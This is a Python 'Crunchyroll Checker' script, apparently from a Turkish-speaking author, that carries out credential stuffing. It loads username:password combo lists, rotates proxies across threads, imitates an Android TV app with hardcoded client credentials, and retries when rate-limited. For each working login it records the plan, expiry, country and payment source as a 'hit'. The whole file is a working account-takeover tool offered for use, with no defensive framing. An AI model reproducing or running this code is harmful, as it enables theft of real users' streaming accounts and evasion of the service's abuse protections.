import requests, json, os, sys, re, time, random
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; D = "\033[90m"; W = "\033[97m"; X = "\033[0m"

baro_st = {"hit": 0, "free": 0, "bad": 0, "rate": 0, "err": 0, "done": 0}
_brn_lk = Lock()

BRN_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AD": "Andorra",
    "AO": "Angola", "AG": "Antigua and Barbuda", "AR": "Argentina", "AM": "Armenia",
    "AU": "Australia", "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas",
    "BH": "Bahrain", "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus",
    "BE": "Belgium", "BZ": "Belize", "BJ": "Benin", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana", "BR": "Brazil",
    "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso", "BI": "Burundi",
    "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada", "CV": "Cape Verde",
    "CF": "Central African Republic", "TD": "Chad", "CL": "Chile", "CN": "China",
    "CO": "Colombia", "KM": "Comoros", "CG": "Congo", "CD": "DR Congo",
    "CR": "Costa Rica", "CI": "Cote d'Ivoire", "HR": "Croatia", "CU": "Cuba",
    "CW": "Curacao", "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark",
    "DJ": "Djibouti", "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador",
    "EG": "Egypt", "SV": "El Salvador", "GQ": "Equatorial Guinea", "ER": "Eritrea",
    "EE": "Estonia", "ET": "Ethiopia", "FJ": "Fiji", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GM": "Gambia", "GE": "Georgia",
    "DE": "Germany", "GH": "Ghana", "GR": "Greece", "GD": "Grenada",
    "GT": "Guatemala", "GN": "Guinea", "GW": "Guinea-Bissau", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KI": "Kiribati", "KP": "North Korea", "KR": "South Korea",
    "KW": "Kuwait", "KG": "Kyrgyzstan", "LA": "Laos", "LV": "Latvia",
    "LB": "Lebanon", "LS": "Lesotho", "LR": "Liberia", "LY": "Libya",
    "LI": "Liechtenstein", "LT": "Lithuania", "LU": "Luxembourg", "MO": "Macao",
    "MK": "North Macedonia", "MG": "Madagascar", "MW": "Malawi", "MY": "Malaysia",
    "MV": "Maldives", "ML": "Mali", "MT": "Malta", "MH": "Marshall Islands",
    "MR": "Mauritania", "MU": "Mauritius", "MX": "Mexico", "FM": "Micronesia",
    "MD": "Moldova", "MC": "Monaco", "MN": "Mongolia", "ME": "Montenegro",
    "MA": "Morocco", "MZ": "Mozambique", "MM": "Myanmar", "NA": "Namibia",
    "NR": "Nauru", "NP": "Nepal", "NL": "Netherlands", "NZ": "New Zealand",
    "NI": "Nicaragua", "NE": "Niger", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PW": "Palau", "PS": "Palestine",
    "PA": "Panama", "PG": "Papua New Guinea", "PY": "Paraguay", "PE": "Peru",
    "PH": "Philippines", "PL": "Poland", "PT": "Portugal", "PR": "Puerto Rico",
    "QA": "Qatar", "RO": "Romania", "RU": "Russia", "RW": "Rwanda",
    "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia", "SC": "Seychelles",
    "SL": "Sierra Leone", "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia",
    "SB": "Solomon Islands", "SO": "Somalia", "ZA": "South Africa", "SS": "South Sudan",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SR": "Suriname",
    "SZ": "Eswatini", "SE": "Sweden", "CH": "Switzerland", "SY": "Syria",
    "TW": "Taiwan", "TJ": "Tajikistan", "TZ": "Tanzania", "TH": "Thailand",
    "TL": "Timor-Leste", "TG": "Togo", "TO": "Tonga", "TT": "Trinidad and Tobago",
    "TN": "Tunisia", "TR": "Turkey", "TM": "Turkmenistan", "TV": "Tuvalu",
    "UG": "Uganda", "UA": "Ukraine", "AE": "UAE", "GB": "United Kingdom",
    "US": "United States", "UY": "Uruguay", "UZ": "Uzbekistan", "VU": "Vanuatu",
    "VE": "Venezuela", "VN": "Vietnam", "YE": "Yemen", "ZM": "Zambia",
    "ZW": "Zimbabwe",
}

BARO_PLANS = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}

BRN_CID = "rjs0ltx0dbwkliwxdzdf"
BRN_SEC = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
BARON_UA = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
BARO_WUA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
            "(KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36")
BRN_API = "https://beta-api.crunchyroll.com"


def baron_check(baro_user, baro_pw, bron_proxy=None):
    brn_s = requests.Session()
    if bron_proxy:
        brn_s.proxies = {"http": bron_proxy, "https": bron_proxy}

    try:
        baron_did = str(uuid.uuid4())
        baro_anon = str(uuid.uuid4())

        baro_r = brn_s.post(f"{BRN_API}/auth/v1/token", data={
            "grant_type": "password",
            "username": baro_user, "password": baro_pw,
            "scope": "offline_access",
            "client_id": BRN_CID, "client_secret": BRN_SEC,
            "device_type": "Google SDK built for x86",
            "device_id": baron_did,
            "device_name": "sdk_google_atv_x86",
        }, headers={
            "User-Agent": BARON_UA,
            "Accept": "application/json",
            "Accept-Charset": "UTF-8",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ETP-Anonymous-ID": baro_anon,
            "Request-Type": "SignIn",
        }, timeout=20)

        brn_src = baro_r.text

        if baro_r.status_code == 429 or "too_many_requests" in brn_src or "rate limited" in brn_src.lower():
            return {"st": "rate"}

        if any(baron_k in brn_src for baron_k in ("invalid_grant", "invalid_credentials")) or baro_r.status_code in (401, 400):
            return {"st": "bad"}

        try:
            baro_data = baro_r.json()
        except:
            return {"st": "err", "info": f"auth json parse fail ({baro_r.status_code})"}

        brn_tk = baro_data.get("access_token", "")
        if not brn_tk:
            return {"st": "err", "info": "no access_token"}

        def baron_hdr():
            return {
                "Authorization": f"Bearer {brn_tk}",
                "User-Agent": BARO_WUA,
                "Accept": "application/json, text/plain, */*",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            }

        baro_username = ""
        try:
            baro_r = brn_s.get(f"{BRN_API}/accounts/v1/me/multiprofile", headers=baron_hdr(), timeout=20)
            brn_m = re.search(r'"username"\s*:\s*"([^"]+)"', baro_r.text)
            if brn_m: baro_username = brn_m.group(1)
        except: pass

        baro_r = brn_s.get(f"{BRN_API}/accounts/v1/me", headers=baron_hdr(), timeout=20)
        try:
            baron_acct = baro_r.json()
        except:
            baron_acct = {}

        brn_extid = baron_acct.get("external_id", "")
        baro_verified = baron_acct.get("email_verified", False)
        baron_acci = baron_acct.get("account_id", "")
        if not baro_username:
            baro_username = baron_acct.get("username", baro_user.split("@")[0])

        brn_res = {
            "st": "free", "user": baro_username,
            "verified": "Yes" if baro_verified else "No",
            "plan": "", "sku": "", "streams": "",
            "expires": "", "renew": "", "country": "",
            "payment": "",
        }

        if not brn_extid:
            return brn_res

        baro_r = brn_s.get(f"{BRN_API}/subs/v1/subscriptions/{brn_extid}/benefits", headers=baron_hdr(), timeout=20)
        baron_bsrc = baro_r.text

        bron_nosub = any(baro_x in baron_bsrc for baro_x in (
            "subscription.not_found", "Subscription Not Found",
            '"total":0', '"subscription_country":""',
        ))

        if bron_nosub or "concurrent_streams" not in baron_bsrc:
            return brn_res

        brn_res["st"] = "hit"

        baron_sm = re.search(r'"concurrent_streams\.(\d+)"', baron_bsrc)
        if baron_sm:
            baro_streams = baron_sm.group(1)
            brn_res["streams"] = baro_streams
            brn_res["plan"] = BARO_PLANS.get(baro_streams, f"PLAN_{baro_streams}")

        brn_cm = re.search(r'"subscription_country"\s*:\s*"([^"]+)"', baron_bsrc)
        if brn_cm:
            baro_cc = brn_cm.group(1)
            brn_res["country"] = BRN_MAP.get(baro_cc, baro_cc)

        baron_pm = re.search(r'"source"\s*:\s*"([^"]+)"', baron_bsrc)
        if baron_pm:
            brn_res["payment"] = baron_pm.group(1)

        if baron_acci:
            try:
                baro_r = brn_s.get(f"{BRN_API}/subs/v3/subscriptions/{baron_acci}", headers=baron_hdr(), timeout=20)
                bron_sub3 = baro_r.text

                brn_em = re.search(r'"expiration_date"\s*:\s*"([^T"]+)', bron_sub3)
                if brn_em: brn_res["expires"] = brn_em.group(1)

                baron_rm = re.search(r'"auto_renew"\s*:\s*(true|false)', bron_sub3)
                if baron_rm: brn_res["renew"] = "Yes" if baron_rm.group(1) == "true" else "No"

                baro_skm = re.search(r'"sku"\s*:\s*"([^"]+)"', bron_sub3)
                if baro_skm: brn_res["sku"] = baro_skm.group(1)
            except: pass

        return brn_res

    except requests.exceptions.ProxyError:
        return {"st": "err", "info": "proxy dead"}
    except requests.exceptions.Timeout:
        return {"st": "err", "info": "timeout"}
    except requests.exceptions.ConnectionError:
        return {"st": "err", "info": "conn failed"}
    except Exception as baron_exc:
        return {"st": "err", "info": str(baron_exc)[:80]}


def baro_retry(baro_user, baro_pw, bron_proxy=None, brn_tries=2):
    for baron_i in range(brn_tries + 1):
        baro_res = baron_check(baro_user, baro_pw, bron_proxy)
        if baro_res["st"] != "rate": return baro_res
        if baron_i < brn_tries: time.sleep(4 + random.random() * 3)
    return baro_res


def brn_log(baro_user, baro_pw, baron_res, brn_files):
    baro_combo = f"{baro_user}:{baro_pw}"
    bron_st = baron_res["st"]
    with _brn_lk:
        baro_st["done"] += 1
        if bron_st == "hit":
            baro_st["hit"] += 1
            baron_cap = (f"User: {baron_res['user']} | Plan: {baron_res['plan']} | "
                         f"Expires: {baron_res.get('expires') or '?'} | Renew: {baron_res.get('renew') or '?'} | "
                         f"Streams: {baron_res.get('streams') or '?'} | "
                         f"Country: {baron_res.get('country') or '?'} | "
                         f"Payment: {baron_res.get('payment') or '?'}")
            print(f"  {G}[HIT]{X} {W}{baro_combo}{X} | {baron_cap}")
            brn_files["hits"].write(f"{baro_combo} | {baron_cap} | @baron_saplar\n"); brn_files["hits"].flush()

        elif bron_st == "free":
            baro_st["free"] += 1
            brn_cap = f"User: {baron_res['user']} | Verified: {baron_res.get('verified', '?')}"
            print(f"  {C}[FREE]{X} {baro_combo} | {brn_cap}")
            brn_files["free"].write(f"{baro_combo} | {brn_cap} | @baron_saplar\n"); brn_files["free"].flush()

        elif bron_st == "bad":
            baro_st["bad"] += 1
            print(f"  {D}[BAD]{X} {D}{baro_combo}{X}")

        elif bron_st == "rate":
            baro_st["rate"] += 1
            print(f"  {Y}[RATE]{X} {baro_combo}")

        else:
            baro_st["err"] += 1
            print(f"  {R}[ERR]{X} {baro_combo} | {baron_res.get('info', '?')}")


def bron_px(baron_raw):
    baron_raw = baron_raw.strip()
    if not baron_raw: return None
    if baron_raw.startswith(("http://", "https://", "socks4://", "socks5://")):
        return baron_raw
    baro_pts = baron_raw.split(":")
    if len(baro_pts) == 4:
        return f"http://{baro_pts[2]}:{baro_pts[3]}@{baro_pts[0]}:{baro_pts[1]}"
    if len(baro_pts) == 2:
        return f"http://{baro_pts[0]}:{baro_pts[1]}"
    return f"http://{baron_raw}"


def baron_run():
    print(f"\n  {M}Crunchyroll Checker{X} {D}@baron_saplar{X}\n")

    baro_combo_path = input("  combo dosyasi: ").strip()
    if not os.path.isfile(baro_combo_path):
        print(f"  {R}dosya bulunamadi{X}"); return

    baron_proxy_path = input("  proxy dosyasi (bos birak atlama): ").strip()
    brn_threads = int(input("  thread [10]: ").strip() or "10")

    baro_pairs = []
    with open(baro_combo_path, "r", errors="ignore") as baron_f:
        for brn_ln in baron_f:
            brn_ln = brn_ln.strip()
            if ":" in brn_ln:
                baro_u, bron_p = brn_ln.split(":", 1)
                if baro_u.strip() and bron_p.strip():
                    baro_pairs.append((baro_u.strip(), bron_p.strip()))

    if not baro_pairs:
        print(f"  {R}combo bos{X}"); return

    baron_pxlist = []
    if baron_proxy_path and os.path.isfile(baron_proxy_path):
        baron_pxlist = [bron_px(baro_l) for baro_l in open(baron_proxy_path) if baro_l.strip()]
        baron_pxlist = [brn_p for brn_p in baron_pxlist if brn_p]

    baro_st["_total"] = len(baro_pairs)
    print(f"\n  {W}{len(baro_pairs)} combo, {len(baron_pxlist)} proxy, {brn_threads} thread{X}\n")

    os.makedirs("output", exist_ok=True)
    baron_tag = datetime.now().strftime("%H%M%S")
    brn_files = {
        "hits": open(f"output/cr_hits_{baron_tag}.txt", "a", encoding="utf-8"),
        "free": open(f"output/cr_free_{baron_tag}.txt", "a", encoding="utf-8"),
    }

    baro_pxi = [0]
    baron_pxlk = Lock()
    def brn_nextpx():
        if not baron_pxlist: return None
        with baron_pxlk:
            baro_p = baron_pxlist[baro_pxi[0] % len(baron_pxlist)]
            baro_pxi[0] += 1
            return baro_p

    baron_t0 = time.time()
    try:
        with ThreadPoolExecutor(max_workers=brn_threads) as baro_pool:
            brn_futs = {baro_pool.submit(baro_retry, baro_u, bron_p, brn_nextpx()): (baro_u, bron_p) for baro_u, bron_p in baro_pairs}
            for baron_fut in as_completed(brn_futs):
                baro_u, bron_p = brn_futs[baron_fut]
                try: baro_res = baron_fut.result()
                except Exception as brn_e: baro_res = {"st": "err", "info": str(brn_e)[:60]}
                brn_log(baro_u, bron_p, baro_res, brn_files)
    finally:
        for baron_f in brn_files.values(): baron_f.close()

    bron_elapsed = time.time() - baron_t0
    print(f"\n  {W}--- BITTI ({bron_elapsed:.1f}s) ---{X}")
    print(f"  {G}Hit: {baro_st['hit']}{X} | {C}Free: {baro_st['free']}{X} | "
          f"Bad: {baro_st['bad']} | {Y}Rate: {baro_st['rate']}{X} | Err: {baro_st['err']}")
    print(f"  sonuclar output/ altinda | @baron_saplar\n")


if __name__ == "__main__":
    baron_run()
